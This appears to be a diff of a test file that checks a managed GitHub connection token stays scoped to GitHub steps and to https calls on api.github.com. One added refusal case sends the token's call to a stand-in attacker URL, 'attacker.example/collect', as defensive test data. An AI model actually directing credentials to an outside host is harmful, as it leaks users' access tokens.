@@ -366,8 +366,9 @@ describe("managed GitHub is scoped to GitHub steps", () => {
     ["an HTTP step header", empty(http({ Authorization: "Bearer " + ref }))],
     ["a Gmail step auth", empty(gmail({ auth: ref }))],
     ["a GitHub step next to a CODE step that reads the token", empty(create(undefined, code({ token: "{{connections['jarvis:github'].access_token}}" })))],
-    // No host is declared, so even api.github.com is only reachable as a path.
-    ["a GitHub custom API call to a full URL", empty(githubCall("https://api.github.com/user"))],
+    ["a GitHub custom API call to another host", empty(githubCall("https://attacker.example/collect"))],
+    ["a GitHub custom API call to plain http on its own host", empty(githubCall("http://api.github.com/user"))],
+    ["a GitHub custom API call to github.com instead of its API host", empty(githubCall("https://github.com/login"))],
   ];
   for (const [label, trigger] of refused) {
     test(`${label} is not ready and the route refuses it`, async () => {
@@ -381,13 +382,12 @@ describe("managed GitHub is scoped to GitHub steps", () => {
     const [issue] = bindingIssues(empty(code({ conn: ref })));
     expect(issue!.message).toBe("Managed connection jarvis:github can only be used by GitHub steps");
     expect(issue!.allowedPieces).toEqual([GITHUB]);
-    // With no host declared, a full-URL custom call is told to use a path and offered no host.
-    const [call] = bindingIssues(empty(githubCall("https://api.github.com/user")));
-    expect(call!.message).toBe("A custom API call with managed connection jarvis:github must use a path under the GitHub API");
+    const [call] = bindingIssues(empty(githubCall("https://attacker.example/collect")));
+    expect(call!.message).toBe("A custom API call with managed connection jarvis:github must use a path under the GitHub API or an https URL on api.github.com");
   });
   // The connection scope only: the managed GitHub action list still refuses a custom API call at dispatch.
-  test("a GitHub step auth, or a custom API call by path, passes the connection scope and resolves", async () => {
-    for (const trigger of [empty(create()), empty(githubCall("/user"))]) {
+  test("a GitHub step auth, or a custom API call on api.github.com, passes the connection scope and resolves", async () => {
+    for (const trigger of [empty(create()), empty(githubCall("/user")), empty(githubCall("https://api.github.com/user"))]) {
       expect(bindingIssues(trigger)).toEqual([]);
       const response = await fetchFor(runOf(trigger), "jarvis:github");
       expect(response.status).toBe(200);
